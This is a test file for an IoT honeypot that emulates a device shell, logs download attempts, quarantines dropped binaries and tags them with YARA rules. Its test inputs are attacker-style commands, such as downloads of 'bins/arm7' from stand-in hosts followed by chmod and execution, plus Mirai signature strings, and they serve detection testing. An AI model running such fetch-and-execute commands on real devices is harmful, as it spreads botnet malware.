"""
HoneyBot-IoT — tests for the v0.7 (70% milestone) fixes and features.

Unit tests run without a database. The integration tests at the bottom need
PostgreSQL (DATABASE_URL, schema auto-applied) and are skipped otherwise.
"""
import os
import sys
import json
import time
import uuid
import asyncio
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.environ.setdefault("REDIS_URL", "redis://127.0.0.1:1/0")          # in-memory state for unit tests
os.environ.setdefault("CAPTURE_DIR", tempfile.mkdtemp(prefix="hb-captures-"))
os.environ.setdefault("DB_CONNECT_RETRIES", "1")       # fail fast when no database is running

import pytest


class FakeSession:
    """Stand-in for common.db.Session that records events in memory."""
    def __init__(self, ip="203.0.113.9", protocol="SSH", device="smartlock"):
        self.id, self.ip, self.protocol, self.device = str(uuid.uuid4()), ip, protocol, device
        self.events, self.commands, self.username = [], [], "root"

    def event(self, event_type, **kw):
        self.events.append((event_type, kw))

    def command(self, cmd, output=None, **kw):
        self.commands.append(cmd)

    def of(self, kind):
        return [kw for t, kw in self.events if t == kind]


def elf(machine=0x28, extra=b""):
    return b"\x7fELF\x01\x01\x01" + b"\x00" * 9 + (2).to_bytes(2, "little") + machine.to_bytes(2, "little") \
        + b"\x00" * 40 + extra


# ── E1: NUL bytes must never break a DB write ──────────────────────────────
def test_sanitize_nul_everywhere():
    from common.db import sanitize, _clip, _json
    assert sanitize("a\x00b") == "a\\x00b"
    assert sanitize(b"\x7fELF\x00") == "\x7fELF\\x00"
    assert "\x00" not in _clip("x" * 10 + "\x00")
    raw = json.loads(_json({"k\x00": ["v\x00", {"n": "\x00"}], "n": 1}))
    assert raw == {"k\\x00": ["v\\x00", {"n": "\\x00"}], "n": 1}
    assert "\\u0000" not in _json({"x": "\x00"})            # JSONB rejects \u0000


# ── E2: scheme-less downloads are logged as IOCs ───────────────────────────
@pytest.mark.parametrize("cmd,url", [
    ("wget 198.51.100.23/bins/arm7 -O x7", "http://198.51.100.23/bins/arm7"),
    ("cd /tmp; curl -O 198.51.100.23/bins/mips", "http://198.51.100.23/bins/mips"),
    ("busybox wget http://evil.example/sh4", "http://evil.example/sh4"),
    ("tftp -g -r mpsl 198.51.100.7", "tftp://198.51.100.7/mpsl"),
])
def test_downloads_logged(cmd, url):
    from common.fakeshell import FakeShell
    s = FakeSession()
    FakeShell("smartlock", session=s).run(cmd)
    urls = [e["url"] for e in s.of("download_attempt")]
    assert urls == [url], urls                                   # exactly once, normalised


# ── malware capture ─────────────────────────────────────────────────────────
def test_sniff_elf_architectures():
    from common.capture import sniff
    assert sniff(elf(0x28)) == ("application/x-elf", "ARM (32-bit LE)")
    assert sniff(elf(0x08))[1].startswith("MIPS")
    assert sniff(b"#!/bin/sh\nwget x")[0] == "text/x-shellscript"
    assert sniff(b"\x1f\x8b\x08\x00")[0] == "application/gzip"


def test_shell_drop_is_captured_and_quarantined():
    from common.fakeshell import FakeShell
    from common import capture
    s = FakeSession()
    sh = FakeShell("smartlock", session=s)
    payload = "\\x7fELF\\x01\\x01\\x01" + "\\x00" * 9 + "\\x02\\x00\\x28\\x00" + "A" * 60
    sh.run(f"echo -ne '{payload}' > /tmp/.bot")
    sh.run("chmod +x /tmp/.bot")
    sh.run("/tmp/.bot")                                          # exec → captured immediately
    caps = s.of("file_capture")
    assert len(caps) == 1 and caps[0]["mime_type"] == "application/x-elf" and caps[0]["arch"].startswith("ARM")
    sha = caps[0]["sha256"]
    path = os.path.join(capture.CAPTURE_DIR, sha[:2], f"{sha}.bin")
    assert os.path.isfile(path)
    assert not os.access(path, os.X_OK) and oct(os.stat(path).st_mode)[-3:] == "400"
    sh.finalize()
    assert len(s.of("file_capture")) == 1                        # not captured twice


def test_trivial_writes_not_captured():
    from common.fakeshell import FakeShell
    s = FakeSession()
    sh = FakeShell("smartlock", session=s)
    sh.run("echo 1 > /tmp/flag")
    sh.finalize()
    assert s.of("file_capture") == []


def test_yara_identifies_families():
    from intel.yara_scan import scan_bytes
    mirai = elf(0x28, b"/dev/watchdog\x00TSource Engine Query\x00LCOGQGPTGP\x00")
    verdict, rules, fams = scan_bytes(mirai)
    assert fams[0] == "mirai" and "IoT_Embedded_ELF" in rules
    assert scan_bytes(b"#!/bin/sh\ncd /tmp; wget http://1.2.3.4/arm7; chmod 777 arm7; ./arm7\n")[0] == "dropper-script"
    assert scan_bytes(b"perfectly ordinary text " * 10)[0] == "CLEAN"


# ── device state ────────────────────────────────────────────────────────────
def test_sensor_config_rejects_unknown_and_actor_key():
    from common.state import DeviceState
    st = DeviceState()
    assert st.sensor_config("http:1.2.3.4", {"actor": "x", "temp_threshold": "20", "evil": 1}) == \
        {"temp_threshold": "20"}
    ch = st.changes("sensor")
    assert ch and ch[0]["actor"] == "http:1.2.3.4"


def test_sensor_history_recorded():
    from common.state import DeviceState
    st = DeviceState()
    for _ in range(3):
        st.tick()
    h = st.history("sensor")
    assert len(h) >= 3 and {"temperature", "pressure", "humidity"} <= set(h[0])


# ── Telnet: IAC split across two TCP reads ──────────────────────────────────
def test_telnet_iac_split_across_reads():
    from telnet_honeypot.telnet_honeypot import TelnetIO, IAC, WILL

    class R:
        def __init__(self, chunks):
            self.chunks = list(chunks)

        async def read(self, n):
            return self.chunks.pop(0) if self.chunks else b""

    class W:
        def write(self, b): pass

        async def drain(self): pass

    io_ = TelnetIO(R([b"ro" + bytes([IAC]), bytes([WILL, 24]) + b"ot\r\n"]), W())
    line = asyncio.run(io_.readline())
    assert line == "root" and io_.negotiation


# ── report rendering (no DB needed) ─────────────────────────────────────────
def test_pdf_renders_from_report_dict():
    from intel.report import render_pdf, summarize
    rep = {"generated_at": "2026-10-15T10:00:00+00:00", "window_hours": 24,
           "totals": {"events": 120, "sessions": 9, "unique_ips": 3, "auth_attempts": 40, "successful_logins": 5,
                      "commands": 30, "detections": 7, "samples": 1, "iocs": 4, "alerts_sent": 1},
           "events_by_protocol": {"SSH": 60, "Telnet": 10, "HTTP": 30, "MQTT": 15, "RTSP": 5},
           "detections_by_severity": {"CRITICAL": 2, "HIGH": 3, "MEDIUM": 2, "LOW": 0},
           "detections_by_type": [{"attack_type": "BRUTE_FORCE", "count": 3, "max_severity": "HIGH"}],
           "top_attackers": [{"ip": "203.0.113.5", "country": "X", "threat_level": "HIGH", "threat_score": 55,
                              "events": 80, "protocols": ["SSH"]}],
           "top_credentials": [{"username": "root", "password": "root", "count": 9, "worked": True}],
           "top_commands": [], "mitre": [{"technique": "T1110", "name": "Brute Force", "detections": 3}],
           "samples": [{"sha256": "a" * 64, "size": 100, "mime_type": "application/x-elf", "arch": "ARM",
                        "yara_result": "mirai", "times": 1}],
           "new_iocs": [{"type": "url", "value": "http://x/y", "hits": 1, "source_ip": "203.0.113.5"}],
           "campaigns": []}
    rep["summary"] = summarize(rep)
    pdf = render_pdf(rep)
    assert pdf[:5] == b"%PDF-" and len(pdf) > 3000
    assert "mirai" in rep["summary"]


def test_weak_label_priority():
    from ml.features import weak_label
    assert weak_label(["BRUTE_FORCE", "MALWARE_FAMILY"]) == "malware_delivery"
    assert weak_label(["WEB_SCAN"]) == "port_scan"
    assert weak_label([]) == "normal"


# ═══════════════════════════════════════════════════════════════════════════
#  Integration (PostgreSQL required)
# ═══════════════════════════════════════════════════════════════════════════
db_ok = True
try:
    from common.db import fetchall
    from common.schema import ensure_schema
    db_ok = bool(fetchall("SELECT 1")) and ensure_schema()
except Exception:
    db_ok = False
needs_db = pytest.mark.skipif(not db_ok, reason="no database (set DATABASE_URL)")


@pytest.fixture(scope="module")
def seeded():
    """Drive the real logging path: a session with a binary drop, a download and detections."""
    from common.db import Session, flush
    from common.fakeshell import FakeShell
    from intel import engine, correlate
    ip = f"198.18.{uuid.uuid4().int % 250}.{uuid.uuid4().int % 250}"
    tag = uuid.uuid4().hex[:8]                       # unique dropper URL per test run
    s = Session("SSH", "smartlock", ip, 40000, 2222)
    for pw in ("a", "b", "c", "d", "e", "f"):
        s.auth("root", pw, False)
    s.auth("root", "root", True)
    sh = FakeShell("smartlock", session=s)
    sh.run(f"cd /tmp; wget 198.51.100.99/bins/arm7-{tag} -O a7; chmod +x a7")
    sh.run("echo -ne '\\x7fELF\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00"
           "/dev/watchdog TSource Engine Query LCOGQGPTGP " + "A" * 40 + "' > /tmp/m")
    sh.run("chmod +x /tmp/m; /tmp/m")
    sh.finalize()
    s.close()
    flush(10)
    engine.run_once()
    engine.run_once()                  # second pass: YARA verdict → MALWARE_FAMILY
    return ip, f"http://198.51.100.99/bins/arm7-{tag}"


@needs_db
def test_nul_rows_are_stored(seeded):
    rows = fetchall("SELECT COUNT(*) FROM events WHERE ip=%s AND event_type='file_write'", (seeded[0],))
    assert rows[0][0] >= 1


@needs_db
def test_capture_indexed_and_yara_scanned(seeded):
    rows = fetchall("SELECT yara_result, arch FROM file_captures WHERE ip=%s", (seeded[0],))
    assert rows and rows[0][0] and "mirai" in rows[0][0] and rows[0][1].startswith("ARM")


@needs_db
def test_detections_include_malware_family(seeded):
    types = {r[0] for r in fetchall("SELECT attack_type FROM detections WHERE ip=%s", (seeded[0],))}
    assert {"MALWARE_FAMILY", "MALWARE_DELIVERY", "BRUTE_FORCE"} <= types, types


@needs_db
def test_ioc_hits_are_idempotent(seeded):
    from intel import correlate
    q = ("SELECT hits FROM iocs WHERE type='url' AND value=%s", (seeded[1],))
    before = fetchall(*q)[0][0]
    correlate.extract_iocs()
    correlate.extract_iocs()
    assert fetchall(*q)[0][0] == before == 1        # one download event → exactly one hit


@needs_db
def test_stix_bundle_is_valid_stix21(seeded):
    stix2 = pytest.importorskip("stix2")
    from intel.stix import build_bundle
    b = build_bundle(24)
    parsed = stix2.parse(json.dumps(b), allow_custom=False)
    types = {o.type for o in parsed.objects}
    assert {"identity", "indicator", "sighting", "attack-pattern", "malware", "relationship"} <= types
    pats = [o.pattern for o in parsed.objects if o.type == "indicator"]
    assert any("SHA-256" in p for p in pats) and any(p.startswith("[url:value") for p in pats)


@needs_db
def test_ml_dataset_labels(seeded):
    from ml.features import build_dataset
    rows = [r for r in build_dataset(1) if r["ip"] == seeded[0]]
    assert rows and rows[0]["label"] == "malware_delivery"
    assert rows[0]["download_attempts"] >= 1 and rows[0]["auth_attempts"] == 7


@pytest.fixture(scope="module")
def client():
    if not db_ok:
        pytest.skip("no database")
    from fastapi.testclient import TestClient
    from api.api import app
    with TestClient(app) as c:
        yield c


@needs_db
@pytest.mark.parametrize("path", ["/api/stats", "/api/captures", "/api/alerts", "/api/campaigns",
                                  "/api/devices/cctv", "/api/devices/smartlock", "/api/devices/sensor",
                                  "/api/report?hours=24", "/api/ml/summary", "/api/timeline?hours=6"])
def test_v07_endpoints(client, path):
    r = client.get(path)
    assert r.status_code == 200, r.text[:300]


@needs_db
def test_attacker_and_session_detail(client, seeded):
    d = client.get(f"/api/attackers/{seeded[0]}").json()
    assert d["attacker"]["ip"] == seeded[0] and d["samples"] and d["detections"]
    sid = d["sessions"][0]["session_id"]
    s = client.get(f"/api/sessions/{sid}").json()
    assert s["session"]["ip"] == seeded[0] and s["samples"]
    assert client.get("/api/sessions/not-a-uuid").status_code == 404
    assert client.get("/api/attackers/192.0.2.254").status_code == 404


@needs_db
def test_exports(client):
    r = client.get("/api/report.pdf?hours=24")
    assert r.status_code == 200 and r.content[:5] == b"%PDF-"
    r = client.get("/api/export/stix?hours=24")
    assert r.status_code == 200 and r.json()["type"] == "bundle"
    m = client.get("/api/metrics").text
    assert "honeybot_events_total" in m and "honeybot_service_up" in m
    assert client.get("/api/ml/dataset.csv").text.startswith("session_id,")


@needs_db
def test_devices_hide_api_token(client):
    for dev in ("smartlock",):
        assert "api_token" not in client.get(f"/api/devices/{dev}").json()["state"]
        assert "api_token" not in client.get("/api/devices").json()["devices"][dev]["state"]


@needs_db
def test_websocket_relays_live_events(client):
    import redis
    url = os.environ.get("REDIS_URL", "")
    try:
        r = redis.Redis.from_url(url, socket_connect_timeout=1)
        r.ping()
    except Exception:
        pytest.skip("redis not reachable")
    with client.websocket_connect("/api/ws") as ws:
        assert json.loads(ws.receive_text())["channel"] == "hello"
        time.sleep(0.3)
        r.publish("honeybot:events", json.dumps({"ip": "192.0.2.1", "event_type": "auth"}))
        msg = json.loads(ws.receive_text())
        assert msg["channel"] == "event" and msg["data"]["ip"] == "192.0.2.1"


@needs_db
def test_report_max_severity_is_ranked_not_alphabetical(seeded):
    from intel.report import build_report
    rank = ["LOW", "MEDIUM", "HIGH", "CRITICAL"]
    expected = {}
    for t, s in fetchall("SELECT attack_type, severity FROM detections WHERE timestamp > NOW() - INTERVAL '24 hours'"):
        expected[t] = max(expected.get(t, "LOW"), s, key=rank.index)
    got = {d["attack_type"]: d["max_severity"] for d in build_report(24)["detections_by_type"]}
    assert got == expected
